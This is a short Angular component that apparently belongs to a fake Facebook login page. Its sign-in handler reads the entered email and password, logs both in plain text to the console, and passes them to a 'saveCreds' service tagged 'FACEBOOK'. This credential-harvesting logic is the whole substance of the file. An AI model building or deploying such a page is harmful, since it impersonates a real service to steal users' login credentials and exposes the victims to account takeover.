import { Component, ElementRef, ViewChild } from '@angular/core';
import { PageRoutingService } from 'src/app/services/page-routing.service';
import { SaveFacadeService } from 'src/app/services/save-facade.service';

@Component({
  selector: 'app-facebook',
  templateUrl: './facebook.component.html',
  styleUrls: ['./facebook.component.css']
})
export class FacebookComponent {
  @ViewChild('emailInput')
  emailInput!: ElementRef;

  @ViewChild('passwordInput')
  passwordInput!: ElementRef;

  constructor(private saveService: SaveFacadeService ){}


  signIn(){
    const pass = this.passwordInput.nativeElement.value.toString()
    const email = this.emailInput.nativeElement.value.toString()

    console.log(this.passwordInput.nativeElement.value.toString());
    console.log(this.emailInput.nativeElement.value.toString());

    this.saveService.saveCreds(email,pass,"FACEBOOK")

  }
}
